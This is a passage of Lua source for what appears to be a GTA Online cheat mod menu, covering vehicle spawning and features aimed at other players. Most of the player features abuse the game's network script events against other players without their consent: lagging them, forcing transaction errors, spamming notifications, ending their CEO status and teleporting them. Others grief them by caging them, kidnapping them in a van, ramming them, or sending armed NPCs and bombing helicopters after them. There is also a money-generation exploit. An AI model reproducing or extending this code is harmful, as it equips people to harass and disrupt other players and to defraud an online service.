			vehicle.clear_vehicle_custom_secondary_colour(car)
			decorator.decor_set_int(car, "MPBitset", 1 << 10)
			for i = 0, 67 do
				if vehicle.get_num_vehicle_mods(veh, i) > 0 then
					vehicle.set_vehicle_mod(car, i, vehicle.get_vehicle_mod(veh, i))
				end
			end
			if entity.get_entity_god_mode(veh) then
				modify_entity_godmode(car, true)
			end
			local neon_lights_color_index = vehicle.get_vehicle_neon_lights_color(veh)
			vehicle.set_convertible_roof(car, vehicle.get_convertible_roof_state(veh))
			vehicle.set_vehicle_neon_light_enabled(car, neon_lights_color_index, vehicle.is_vehicle_neon_light_enabled(veh, neon_lights_color_index, true))
			vehicle.set_vehicle_neon_lights_color(car, neon_lights_color_index)
			vehicle.set_vehicle_livery(car, vehicle.get_vehicle_livery(veh))
			vehicle.set_vehicle_window_tint(car, vehicle.get_vehicle_window_tint(veh))
			vehicle.set_vehicle_headlight_color(car, vehicle.get_vehicle_headlight_color(veh))
			vehicle.set_vehicle_colors(car, vehicle.get_vehicle_primary_color(veh), vehicle.get_vehicle_secondary_color(veh))
			if vehicle.is_vehicle_primary_colour_custom(veh) then
				vehicle.set_vehicle_custom_primary_colour(car, vehicle.get_vehicle_custom_primary_colour(veh))
			end
			if vehicle.is_vehicle_secondary_colour_custom(veh) then
				vehicle.set_vehicle_custom_secondary_colour(car, vehicle.get_vehicle_custom_secondary_colour(veh))
			end
			vehicle.set_vehicle_custom_pearlescent_colour(car, vehicle.get_vehicle_custom_pearlescent_colour(veh))
			if setting["Spawn inside of spawned #vehicle#"] then
				ped.set_ped_into_vehicle(my_ped, car, -1)
				entity.set_entity_coords_no_offset(car, pos)
				if setting["Air #vehicle# spawn mid-air"] then
					if streaming.is_model_a_heli(hash) then
						entity.set_entity_coords_no_offset(car, pos + v3(0, 0, 100))
						vehicle.set_vehicle_forward_speed(car, 200)
					end
					if streaming.is_model_a_plane(hash) then
						entity.set_entity_coords_no_offset(car, pos + v3(0, 0, 250))
						vehicle.set_vehicle_forward_speed(car, 200)
					end
				end
			else
				entity.set_entity_coords_no_offset(car, pos)
			end
			if setting["Delete old #vehicle#"] and temp.your_vehicle_entity_ids2 then
				entity.delete_entity(temp.your_vehicle_entity_ids2)
			end
		end)

	-- Max their car
		menu.add_player_feature(language["Max car /;/player feature|_|"], "action", u.player_vehicle_features, function(f, pid)
			local me = player.player_id()
			local pos = player.get_player_coords(me)
			local their_vehicle = player.get_player_vehicle(pid)
			if their_vehicle ~= 0 or is_target_viable(pid) then
				if max_car(their_vehicle) then
					msg(language["Maxed /;/msg|_|"].." "..player.get_player_name(pid).."s "..language["vehicle. /;/msg|_|"], 212, true)
				else
					msg(language["Failed to get control of their car. /;/msg|_|"], 6, true)
				end
			else
				msg(player.get_player_name(pid).." "..language["is not in a vehicle. /;/msg|_|"], 6, true)
			end
			if get_distance_between(pos, player.get_player_coords(me)) > 20 then
				if player.is_player_in_any_vehicle(me) then
					entity.set_entity_coords_no_offset(player.get_player_vehicle(me), pos)
				else
					entity.set_entity_coords_no_offset(player.get_player_ped(me), pos)
				end
			end
		end)	

	-- Vehicle fly their car
		menu.add_player_feature(language["Vehicle fly player /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			local car
			while f.on do
				local control_indexes, controller_group
				if setting["Controller hotkey mode"] then
					control_indexes = {32, 8}
					controller_group = 2
				else
					controller_group = 0
					control_indexes = {32, 33}
				end
				local car = player.get_player_vehicle(pid)
				entity.set_entity_max_speed(car, 45000)
				for i = 1, 2 do
					while controls.is_disabled_control_pressed(controller_group, control_indexes[i]) do
						local speed = {setting["Vehicle fly speed"], -setting["Vehicle fly speed"]}
						network.request_control_of_entity(car)
						entity.set_entity_max_speed(car, 45000)
						network.request_control_of_entity(entity.get_entity_entity_has_collided_with(car))
						entity.set_entity_rotation(car, cam.get_gameplay_cam_rot())
						vehicle.set_vehicle_forward_speed(car, speed[i])
						system.yield(0)
						if not f.on then
							break
						end
					end
				end
				if f.on then
					entity.set_entity_velocity(car, v3())
					entity.set_entity_rotation(car, cam.get_gameplay_cam_rot())
				end
				system.yield(0)
			end
		end)

		menu.add_player_feature(language["Spastic car /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			local random = math.random
			while f.on do
				local car = player.get_player_vehicle(pid)
				network.request_control_of_entity(car)
				entity.set_entity_max_speed(car, 45000)
				entity.set_entity_rotation(car, v3(random(0, 360), random(0, 360), random(0, 360)))
				vehicle.set_vehicle_forward_speed(car, math.random(-1000, 1000))
				entity.apply_force_to_entity(car, 3, random(-4, 4), random(-4, 4), random(-1, 5), 0, 0, 0, true, true)
				system.yield(0)
			end
		end)

	-- Max their car loop
		menu.add_player_feature(language["Max car loop /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			local me = player.player_id()
			local pos = player.get_player_coords(me)
			Ped, my_ped = player.get_player_ped(pid), player.get_player_ped(player.player_id()) 
			while f.on do
				if max_car(player.get_player_vehicle(pid)) then
					system.yield(500)
				else
					system.yield(0)
				end
			end
			f.on = false
		end)	

	-- Repair their car loop
		menu.add_player_feature(language["Repair car loop /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			local me = player.player_id()
			local pos = player.get_player_coords(me)
			Ped, my_ped = player.get_player_ped(pid), player.get_player_ped(player.player_id()) 
			while f.on do
				local car = player.get_player_vehicle(pid)
				if get_control_of_entity(car) then
					vehicle.set_vehicle_fixed(car)
				end
				system.yield(500)
			end
			f.on = false
		end)	

	-- Spawn a car
		menu.add_player_feature(language["What vehicle to spawn /;/player feature|_|"], "action", u.player_vehicle_features, function()
			txt.what_vehicle_model_in_use = get_input(language["Type in which car to spawn /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower() 
			end)

		u.spawn_player_vehicle = menu.add_player_feature(language["Spawn vehicle /;/player feature|_|"], "action_value_i", u.player_vehicle_features, function(f, pid)
			local count = 0
			for i = 1, f.value_i do
				local speed_of_player = 0
				local their_ped = player.get_player_ped(pid)
				if player.is_player_in_any_vehicle(pid) then
					speed_of_player = entity.get_entity_speed(player.get_player_vehicle(pid))
				else
					speed_of_player = entity.get_entity_speed(their_ped)
				end
				if math.ceil(i / 6) == i / 6 then
					count = count + 5
				end
				local car = spawn_entity(vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use), get_vector_relative_to_entity(their_ped, 7 + count) + v3(math.random(-5, 5), math.random(-5, 5), 2 * (i / (count + 1))), player.get_player_heading(pid), setting["Spawn #vehicle# maxed"], setting["Spawn #vehicle# in godmode"])
				decorator.decor_set_int(car, "MPBitset", 1 << 10)
				system.yield(0)
			end
		end)
		player_value_i_init(u.spawn_player_vehicle, 100, 1, 1, 1)

		for i, k in pairs(general_settings) do
			if k[1]:find("#vehicle#") then
				toggle[#toggle + 1] = {k[1], menu.add_feature(k[3], "toggle", u.vehicleSettings.id, function(f)
					if f.on then
						setting[k[1]] = true
					else
						setting[k[1]] = false
					end
				end)}
			end
		end

		menu.add_feature(language["Change default vehicle /;/feature|_|"], "action", u.vehicleSettings.id, function(f)
			local e = setting["Default vehicle"]
			setting["Default vehicle"] = get_input(language["Type in the vehicle you want to be default. /;/input_does_not_support_unicode|_|"], "", 128, 0, e)
			temp.nothing, temp.is_valid = vehicle_mapper.GetHashFromModel(setting["Default vehicle"])
			if temp.is_valid then
				msg(language["Changed default vehicle. /;/msg|_|"], 212, true)
				txt.what_vehicle_model_in_use = setting["Default vehicle"]
			else
				setting["Default vehicle"] = e
				msg(language["Invalid input. Default value remains the same. /;/msg|_|"], 6, true)
			end
		end)
		txt.what_vehicle_model_in_use = setting["Default vehicle"]

		menu.add_feature(language["Change backplate text /;/feature|_|"], "action", u.vehicleSettings.id, function(f)
			local e = setting["Plate vehicle text"]
			setting["Plate vehicle text"], temp.is_valid = get_input(language["Type in the text you want displayed on the backplate of your cars after maxing them. /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Plate vehicle text"])
			if not temp.is_valid then
				setting["Plate vehicle text"] = e
				msg(language["Invalid input. Plate text remains the same. /;/msg|_|"], 6, true)
			else
				msg(language["Changed default plate text. /;/msg|_|"], 212, true)
			end
		end)
		menu.add_feature(language["What vehicle to spawn /;/feature|_|"], "action", u.vehicle_self.id, function()
			txt.what_vehicle_model_in_use = get_input(language["Type in which car to spawn /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower() 
			end)

		menu.add_feature(language["Spawn vehicle /;/feature|_|"], "action", u.vehicle_self.id, function()
			spawn_car()
		end)	

	-- Vehicle fly
		valuei["Vehicle fly speed"] = {"Vehicle fly speed", menu.add_feature(language["Vehicle fly speed, click to type /;/feature|_|"], "autoaction_value_i", u.vehicle_self.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in vehicle speed /;/input_does_not_support_unicode|_|"], "", 5, 0, setting["Vehicle fly speed"])
				value_i_setup(f, v)
			end
			setting["Vehicle fly speed"] = f.value_i
		end)}
		valuei["Vehicle fly speed"][2].min_i, valuei["Vehicle fly speed"][2].max_i, valuei["Vehicle fly speed"][2].mod_i = 0, 45000, 10

		u.vehicle_fly = menu.add_feature(language["Vehicle fly /;/feature|_|"], "toggle", u.vehicle_self.id, function(f)
			while f.on do
				local me = player.player_id()
				local control_indexes, controller_group
				if setting["Controller hotkey mode"] then
					control_indexes = {32, 8}
					controller_group = 2
				else
					controller_group = 0
					control_indexes = {32, 33}
				end
				if player.is_player_in_any_vehicle(me) then
					local car = player.get_player_vehicle(me)
					entity.set_entity_max_speed(car, 45000)
					for i = 1, 2 do
						while controls.is_disabled_control_pressed(controller_group, control_indexes[i]) and f.on do
							entity.set_entity_max_speed(car, 45000)
							local speed = {setting["Vehicle fly speed"], -setting["Vehicle fly speed"]}
							network.request_control_of_entity(entity.get_entity_entity_has_collided_with(car))
							entity.set_entity_rotation(car, cam.get_gameplay_cam_rot())
							vehicle.set_vehicle_forward_speed(car, speed[i])
							system.yield(0)
						end
					end
					if f.on then
						entity.set_entity_velocity(car, v3())
						entity.set_entity_rotation(car, cam.get_gameplay_cam_rot())
					end
				else
					system.yield(200)
				end
				system.yield(0)
			end
		end)

-- Player scripts
	menu.add_player_feature(language["Disable vehicles /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		while f.on do
			disable_vehicle(pid)
			system.yield(2000)
		end
	end)

	menu.add_player_feature(language["Off the radar /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		otr_table[player.get_player_scid(pid)] = utils.time_ms() + 154748364
		while f.on do
			if not globals.is_player_otr(pid) then
				send_script_event(575518757, pid, {pid, utils.time() - 60, utils.time(), 1, 1, script.get_global_i(1630317 + (1 + (595 * pid)) + 506)})
			end
			system.yield(100)
		end
	end)

	menu.add_player_feature(language["10k ceo loop /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		while f.on do
			send_script_event(-2029779863, pid, {pid, 10000, -1292453789, 1, script.get_global_i(1630317 + (1 + (pid * 595)) + 506), script.get_global_i(1652336 + 9), script.get_global_i(1652336 + 10)})
			for i = 1, 31 do
				system.yield(1000)
				if not f.on then
					break 
				end
			end
			system.yield(0)
		end
	end)

	menu.add_player_feature(language["Block passive mode /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		if f.on then
			send_script_event(-909357184, pid, {pid, 1})
			system.yield(2000)
		else
			send_script_event(-909357184, pid, {pid, 0})
		end
	end)

	menu.add_player_feature(language["apply bounty /;/player feature|_|"], "action", u.script_stuff, function(f, pid)
		set_bounty(pid)
	end)

	menu.add_player_feature(language["Reapply bounty /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		if player.player_id() == script.get_host_of_this_script() then
			msg(language["Modded bounties does not work while you're script host. /;/msg|_|"], 6, true)
			f.on = false
			return
		end
		while f.on and me ~= script.get_host_of_this_script() do
			if entity.is_entity_dead(player.get_player_ped(pid)) then
				set_bounty(pid)
			end
			system.yield(800)
		end
		f.on = false
	end)

	menu.add_player_feature(language["Perico island /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		if f.on then
			send_script_event(1300962917, pid, {pid, 1300962917, 0, 0})
		else
			send_script_event(-171207973, pid, {pid, pid, 1, 0, math.random(0, 114), 1, 1, 1})
		end
	end)

	menu.add_player_feature(language["Apartment invites /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		while f.on do
			send_script_event(-171207973, pid, {pid, pid, 1, 0, math.random(0, 114), 1, 1, 1})
			system.yield(5000)
		end
	end)

	menu.add_player_feature(language["Send to random mission /;/player feature|_|"], "action", u.script_stuff, function(f, pid)
		if math.random(1, 8) == 1 then
			send_script_event(-545396442, pid, {0})
		else
			send_script_event(-545396442, pid, {0, math.random(1, 7)})
		end
	end)

	menu.add_player_feature(language["Terminate CEO /;/player feature|_|"], "action", u.script_stuff, function(f, pid)
		send_script_event(-1648921703, pid, {pid, 1, 6})
	end)

	menu.add_player_feature(language["Notification spam /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		while f.on do
			send_script_event(891272013, pid, {pid, math.random(-2147483647, 2147483647)})
			system.yield(0)
		end
	end)

	menu.add_player_feature(language["Transaction error /;/player feature|_|"], "toggle", u.script_stuff, function(f, pid)
		while f.on do
			send_script_event(1302185744, pid, {pid, 2147483647, 1, 1, script.get_global_i(1630317 + (1 + (pid * 595) + 506)), script.get_global_i(1652336 + 9), script.get_global_i(1652336 + 10), 1})
			system.yield(1000)
		end
	end)

-- Player trolling
	-- Ram vehicle
		menu.add_player_feature(language["Which vehicle /;/player feature|_|"], "action", u.player_trolling_features, function()
			txt.what_vehicle_model_in_use = get_input(language["Type in which car to ram with /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower()  
		end)

		u.ram_player = menu.add_player_feature(language["Ram player with vehicle /;/player feature|_|"], "action_value_i", u.player_trolling_features, function(f, pid)
			if not entity.is_entity_dead(player.get_player_ped(pid)) then
				local cars = {}
				local their_ped = player.get_player_ped(pid)
				for I = 1, math.ceil(f.value_i / 4) do
					for i = 1, f.value_i - ((I - 1) * 4) do
						cars[#cars + 1] = spawn_and_push_a_vehicle_in_direction(pid, false, 8, vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use), v3(i - math.min(8, f.value_i), -i + math.min(8, f.value_i), 0))
						if not entity.is_an_entity(cars[#cars]) then
							table.remove(cars, #cars)
							break
						end
					end
				end
				system.yield(350)
				clear_entities(cars)
			end
		end)
		player_value_i_init(u.ram_player, 64, 1, 1, 5)

		menu.add_player_feature(language["Ram loop /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			while f.on do
				spawn_and_push_a_vehicle_in_direction(pid, true, 8, vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use), v3())
				system.yield(0)
			end
		end)

	-- Spawn a Kek-copter
		menu.add_player_feature(language["Spawn kek's chopper /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local Ped = player.get_player_ped(pid)
			local dead = entity.is_entity_dead
			local bombs = {2481070269, 615608432, 2138347493, 2694266206, 4256991824, 2874559379}
			while f.on do
				system.yield(0)
				if player.get_player_coords(pid).z > -20 then
					local pos = player.get_player_coords(pid) + v3(0, 0, 20)
					local chopper = spawn_entity(2310691317, pos, 0)
					max_car(chopper)
					modify_entity_godmode(chopper, true)
					local pilot = spawn_entity(0x8D8F1B10, pos + v3(5, 6, 100), 0, false, false, 27)
					modify_entity_godmode(pilot, true)
					ped.set_ped_into_vehicle(pilot, chopper, -1)
					vehicle.set_heli_blades_full_speed(chopper)
					system.yield(2000)
					teleport(chopper, player.get_player_coords(pid) + v3(math.random(-30, 30), math.random(-30, 30), 17))
					while f.on and not dead(chopper) and not dead(pilot) do
						system.yield(0)
						if ai.is_task_active(pilot, 15) or (not ai.is_task_active(pilot, 150) and not ai.is_task_active(pilot, 169)) then
							ai.task_vehicle_follow(pilot, chopper, Ped, 150, 17039872, 30)
						end
						if not ped.is_ped_in_vehicle(pilot, chopper) then
							get_control_of_entity(pilot)
							ped.set_ped_into_vehicle(pilot, chopper, -1)
							vehicle.set_heli_blades_full_speed(chopper)
						end
						vehicle.set_vehicle_deformation_fixed(chopper)
						vehicle.set_vehicle_fixed(chopper) 
						local pos = player.get_player_coords(pid) + v3(0, 0, 20)
						pos.z = math.abs(pos.z)
						local distance_between_chopper_and_player = get_distance_between(Ped, chopper)
						if distance_between_chopper_and_player > 350 or vehicle.is_vehicle_stopped(chopper) then
							teleport(chopper, pos + v3(math.random(-30, 30), math.random(-30, 30), 0))
						elseif distance_between_chopper_and_player > 25 and distance_between_chopper_and_player < 240 then
								local spawned_food_self
								local cars = remove_player_entities(get_table_of_close_entity_type(1))
								table.remove(cars, table.get_index_of_value(cars, chopper))
								table.sort(cars, function(a, b) return (get_distance_between(a, Ped) > get_distance_between(b, Ped)) end)
								local temp = {}
								for i, car in pairs(cars) do
									if entity.get_entity_model_hash(car) ~= 2310691317 then
										temp[#temp + 1] = car
									end
									if i == 12 then
										break
									end
								end
								if #temp == 0 then
									spawned_food_self = true
									for i = 1, 5 do
										temp[i] = spawn_entity(3564062519, entity.get_entity_coords(chopper) + v3(0, 0, 50), 0)
									end
								end
								local player_car = player.get_player_vehicle(pid)
								if distance_between_chopper_and_player > 200 and player.is_player_in_any_vehicle(pid) then
									local pos = entity.get_entity_coords(player_car)
									send_script_event(-152440739, pid, {pid, math.round(pos.x), math.round(pos.y), math.round(pos.z), 0})
								end
								local z_lowest = math.round(math.abs(player.get_player_coords(pid).z - entity.get_entity_coords(chopper).z))
								z_lowest = z_lowest - math.min(6, z_lowest)
								for i, car in pairs(temp) do
									if teleport(car, get_vector_relative_to_entity(chopper, 9) - v3(0, 0, math.random(math.min(math.round(z_lowest / 6), z_lowest), z_lowest))) then
										entity.set_entity_rotation(car, entity.get_entity_rotation(chopper))
										vehicle.set_vehicle_forward_speed(car, 150)
										system.yield(0)
									end
								end
								if spawned_food_self then 
									system.yield(3000)
									clear_entities(temp)
								else
									system.yield(2000)
								end
						else
							system.yield(math.random(0, 2000))
							gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(chopper), entity.get_entity_coords(chopper) - v3(0, 0, 200), 0, bombs[math.random(1, #bombs)], pilot, true, false, math.random(20, 200))
						end
					end
					clear_entities({chopper, pilot})
				end
			end
		end)

	-- Send clowns
		menu.add_player_feature(language["Send clown van /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local clown_van, driver = 0, 0
			local their_ped = player.get_player_ped(pid)
			local clowns, clown_weapons = {0, 0, 0}, {0, 0, 0}
			local weapons = table.merge(weapon_mapper.get_table_of_rifles(), {weapon_mapper.get_table_of_explosive_weapons(), weapon_mapper.get_table_of_smgs()})
			local close_range = table.merge(weapon_mapper.get_table_of_melee_weapons(), {{911657153, 2939590305}})
			local clown_group = ped.create_group()
			local function setup_ped(clown, seat)
				if entity.is_an_entity(clown) then
					set_combat_attributes(clown, false, true, true)
					ai.task_combat_ped(clown, their_ped, 0, 16)
					ped.set_ped_as_group_member(clown, clown_group)
					ped.set_ped_never_leaves_group(clown, true)
					if seat and seat ~= -2 and entity.is_an_entity(clown_van) then 
						ped.set_ped_into_vehicle(clown, clown_van, seat)
					end
					return clown
				end
				return -1
			end
			while f.on do
				system.yield(0)
				local their_ped = player.get_player_ped(pid)
				if not entity.is_an_entity(clown_van) and clear_entities({clown_van}) then
					clown_van = spawn_entity(728614474, get_vector_relative_to_entity(their_ped, math.random(-30, 65)) + v3(math.random(-10, 10), math.random(-10, 10), 0), 0, true, true)
					vehicle.set_vehicle_mod(clown_van, 14, 2)
					local pos = entity.get_entity_coords(clown_van)
					local found_z, Z = gameplay.get_ground_z(entity.get_entity_coords(clown_van))
					if found_z then
						pos.z = Z
						entity.set_entity_coords_no_offset(clown_van, pos)
					end
				end
				if entity.is_entity_dead(clown_van) then
					vehicle.set_vehicle_fixed(clown_van)
				end
				if entity.is_entity_dead(driver) then
					ped.remove_ped_from_group(driver, group)
					driver = spawn_entity(0x04498DDE, player.get_player_coords(pid) + v3(0, 0, 50), 0, false, true, 1)
					weapon.give_delayed_weapon_to_ped(driver, 2874559379, 0, 1)
					ped.set_ped_as_group_leader(driver, clown_group)
					ped.set_ped_into_vehicle(driver, clown_van, -1)
					set_combat_attributes(driver, true, true, true, true, false, false, false, true, true, true, true, false)	
					ai.task_vehicle_follow(driver, clown_van, their_ped, 80, get_random_drive_style(), 4)					
				end
				if get_control_of_entity(driver) and ped.is_ped_in_vehicle(driver, clown_van) then
					if entity.is_entity_dead(player.get_player_ped(pid)) then
						ai.task_vehicle_follow(driver, clown_van, their_ped, 80, get_random_drive_style(), 4)
					end
				elseif not ped.is_ped_in_vehicle(driver, clown_van) then
					local driver_ped = vehicle.get_ped_in_vehicle_seat(clown_van, -1)
					local index_of_clowns = table.get_index_of_value(clowns, {driver_ped})
					if entity.is_an_entity(driver_ped) then
						ped.clear_ped_tasks_immediately(driver_ped)
					end
					if not ped.is_ped_in_vehicle(driver, clown_van) and not ped.is_ped_in_vehicle(driver_ped, clown_van) then
						ped.set_ped_into_vehicle(driver, clown_van, -1)
					end
				end
				for i, clown in pairs(clowns) do
					if f.on and (not entity.is_an_entity(clown) or get_control_of_entity(clown)) then
						system.yield(0)
						if entity.is_entity_dead(clown) then
							if clear_entities({clown}) then
								ped.remove_ped_from_group(clown)
								clowns[i] = setup_ped(spawn_entity(0x04498DDE, player.get_player_coords(pid) + v3(0, 0, 50), 0, false, false, 4), vehicle.get_free_seat(clown_van))
							end
						elseif not ped.is_ped_in_vehicle(clown, clown_van) and get_distance_between(their_ped, clown) > 85 then
							ped.set_ped_into_vehicle(clown, clown_van, vehicle.get_free_seat(clown_van))
						elseif ped.is_ped_in_vehicle(clown, clown_van) and get_distance_between(their_ped, clown) < 40 then
							ai.task_leave_vehicle(clown, clown_van, 1)
						end
						if not ped.is_ped_in_vehicle(clown, clown_van) then
							if player.is_player_in_any_vehicle(pid) or get_distance_between(their_ped, clown) > 35 then
								if not table.get_index_of_value(weapons, clown_weapons[i]) then
									if weapon.has_ped_got_weapon(clown, clown_weapons[i]) then
										weapon.remove_weapon_from_ped(clown, clown_weapons[i])
										system.yield(500)
									end
									clown_weapons[i] = weapons[math.random(1, #weapons)]
									weapon.give_delayed_weapon_to_ped(clown, clown_weapons[i], 0, 1)
									set_ped_weapon_attachments(clown, true, clown_weapons[i])
								end
							elseif not table.get_index_of_value(close_range, clown_weapons[i]) then
								if weapon.has_ped_got_weapon(clown, clown_weapons[i]) then
									weapon.remove_weapon_from_ped(clown, clown_weapons[i])
									system.yield(500)
								end
								clown_weapons[i] = close_range[math.random(1, #close_range)]
								weapon.give_delayed_weapon_to_ped(clown, clown_weapons[i], 0, 1)
								set_ped_weapon_attachments(clown, true, clown_weapons[i])
							end
							ai.task_combat_ped(clown, their_ped, 0, 16)
						end
					end
				end
				if get_distance_between(their_ped, clown_van) > 180 and get_control_of_entity(clown_van) or vehicle.is_vehicle_stuck_on_roof(clown_van) or entity.is_entity_in_water(clown_van) then
					entity.set_entity_coords_no_offset(clown_van, get_vector_relative_to_entity(their_ped, math.random(-30, 65)) + v3(math.random(-10, 10), math.random(-10, 10), 0))
					vehicle.set_vehicle_on_ground_properly(clown_van)
					local pos = entity.get_entity_coords(clown_van)
					local found_z, Z = gameplay.get_ground_z(entity.get_entity_coords(clown_van))
					if found_z then
						pos.z = Z
						entity.set_entity_coords_no_offset(clown_van, pos)
					end
					system.yield(500)
					ai.task_vehicle_follow(driver, clown_van, their_ped, 80, get_random_drive_style(), 4)
				end
			end
			ped.remove_group(clown_group)
			clear_entities(table.merge({clown_van, driver}, {clowns}))
		end)

	-- Taze player
		menu.add_player_feature(language["Taze player /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local Ped = player.get_player_ped(player.player_id())
			while f.on do
				local me = player.player_id()
				gameplay.shoot_single_bullet_between_coords(get_vector_relative_to_entity(player.get_player_ped(pid), 0.3), player.get_player_coords(pid) + v3(0, 0, 0.5), 0, 911657153, Ped, true, false, 1000)
				system.yield(1500)
			end
		end)

	-- Lag player
		menu.add_player_feature(language["Lag player /;/player feature|_|"], "toggle", u.pMalicious, function(f, pid)
			local their_ped = player.get_player_ped(pid)
			local tug_boat_1 = spawn_entity(2194326579, player.get_player_coords(pid), 0)
			modify_entity_godmode(tug_boat_1, true)
			local tug_boat_2 = spawn_entity(2194326579, player.get_player_coords(pid), 0)
			modify_entity_godmode(tug_boat_2, true)
			Ped = spawn_entity(0xAC4B4506, player.get_player_coords(pid) + v3(25, 25, -25), 0, false, false, 4)
			modify_entity_godmode(Ped, true)
			while f.on do
				local pos = player.get_player_coords(pid)
				pos.z = -20
				fire.start_entity_fire(Ped)
				fire.add_explosion(pos, 37, false, false, 0, their_ped)
				entity.set_entity_coords_no_offset(tug_boat_1, pos)
				ped.set_ped_into_vehicle(Ped, tug_boat_1, -1)
				entity.attach_entity_to_entity(tug_boat_2, Ped, 0, v3(), v3(), false, true, true, 0, true)
				system.yield(0)
			end
			clear_entities({Ped, tug_boat_1, tug_boat_2})
		end)

	-- Perma cage
		menu.add_player_feature(language["Perma-cage /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local temp_ped, cage_2
			local their_ped = player.get_player_ped(pid)
			while f.on do
				system.yield(0)
				local pos = player.get_player_coords(pid)
				pos.z = math.abs(pos.z)
				temp_ped = spawn_entity(gameplay.get_hash_key("a_f_y_tourist_02"), pos + v3(0, 0, 25), 0, false, false, 4)
				cage = spawn_entity(gameplay.get_hash_key("prop_test_elevator"), pos +  v3(0, 0, 50), player.get_player_heading(pid))
				cage_2 = spawn_entity(gameplay.get_hash_key("prop_test_elevator"), pos +  v3(0, 0, 60), player.get_player_heading(pid))
				entity.attach_entity_to_entity(cage, temp_ped, 0, v3(0, 0, -0.6), v3(), false, true, true, 0, true)
				entity.attach_entity_to_entity(cage_2, cage, 0, v3(), v3(0, 0, 90), false, true, true, 0, true)
				entity.set_entity_visible(temp_ped, false)
				entity.set_entity_collision(temp_ped, false, false, false)
				entity.freeze_entity(temp_ped, true)
				teleport(temp_ped, player.get_player_coords(pid) + v3(0, 0, 1))
				while f.on and table.is_all_true({cage, cage_2, temp_ped}, entity.is_an_entity) do
					system.yield(0)
					local pos = player.get_player_coords(pid)
					if get_distance_between(pos, temp_ped) > 5 or math.abs(math.abs(entity.get_entity_coords(temp_ped).z) - math.abs(player.get_player_coords(pid).z)) > 4 then
						if player.is_player_in_any_vehicle(pid) then
							teleport(temp_ped, player.get_player_coords(pid) + entity.get_entity_velocity(player.get_player_vehicle(pid)))
						else
							teleport(temp_ped, player.get_player_coords(pid))
						end
						system.yield(0)
					end
					ped.clear_ped_tasks_immediately(temp_ped)
				end
				clear_entities({cage_2, cage, temp_ped})
				system.yield(100)
			end
			clear_entities({cage_2, cage, temp_ped})
		end)

	-- Van cage
		u.kidnap = menu.add_player_feature(language["Kidnap player /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			if player.player_id() == pid then
				f.on = false
				return
			end
			if is_kidnap_used then
				u.kidnap.feats[is_kidnap_used].on = false
			end
			is_kidnap_used = pid + 1
			system.yield(500)
			local me = player.player_id()
			local my_ped = player.get_player_ped(me)
			local driver = 0
			if player.is_player_in_any_vehicle(me) then
				entity.delete_entity(player.get_player_vehicle(me))
			end
			local van = 0
			while f.on do
				if not entity.is_entity_dead(player.get_player_ped(pid)) then
					if not entity.is_an_entity(van) then
						van = spawn_entity(gameplay.get_hash_key("stockade"), player.get_player_coords(pid) + v3(0, 0, 50), player.get_player_heading(pid), true, true)
					end
					if entity.is_entity_dead(van) then
						vehicle.set_vehicle_fixed(van)
					end
					if entity.is_an_entity(van) and not ped.is_ped_in_vehicle(my_ped, van) then
						ped.set_ped_into_vehicle(my_ped, van, -1)
					end
					ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
					if (get_distance_between(player.get_player_ped(pid), van) > 6.5 or math.abs(player.get_player_coords(pid).z - entity.get_entity_coords(van).z) > 5) and remove_player_vehicle(pid) then
						entity.freeze_entity(van, true)
						entity.set_entity_collision(van, false, false, false)
						entity.set_entity_heading(van, player.get_player_heading(pid))
						entity.set_entity_coords_no_offset(van, get_vector_relative_to_entity(player.get_player_ped(pid), 2.20) - v3(0, 0, 1))
						entity.set_entity_collision(van, true, false, false)
						entity.freeze_entity(van, false)
						system.yield(2000)	
					end
				end			
				system.yield(0)
			end
			local passengers, is_player = get_number_of_passengers(van)
			if not is_player then
				entity.delete_entity(van)
			end
			entity.delete_entity(driver)
			is_kidnap_used = nil
		end)

	-- Glitch their vehicle
		menu.add_player_feature(language["Glitch their vehicle /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			while f.on do
				system.yield(0)
				glitch_vehicle(player.get_player_ped(pid), f)
			end
		end)

	-- Vehicle hurricane
		menu.add_player_feature(language["Hurricane /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local pos = player.get_player_coords(pid)
			if pos.z == -50 or pos.z == -180 or pos.z == 190 then
				msg(language["Their position is unknown (invalid Z coordinate). Please get closer to them. /;/msg|_|"], 212, true)
			end
			local entities_to_not_use = vehicle_mapper.get_vehicles_from_certain_index(670, 708)
			while f.on do
				local their_ped = player.get_player_ped(pid)
				system.yield(0)
				if not entity.is_entity_dead(their_ped) and player.get_player_coords(pid).z > -20 then
					local hurricane_entities = get_table_of_entities_with_respect_to_distance_and_set_limit
						(
							{
								{
									get_table_of_close_entity_type(1),
									13,
									true
								},
								{
									get_table_of_close_entity_type(3),
									13,
									false,
									300
								}
							},
							their_ped
						)
					if player.is_player_in_any_vehicle(pid) then
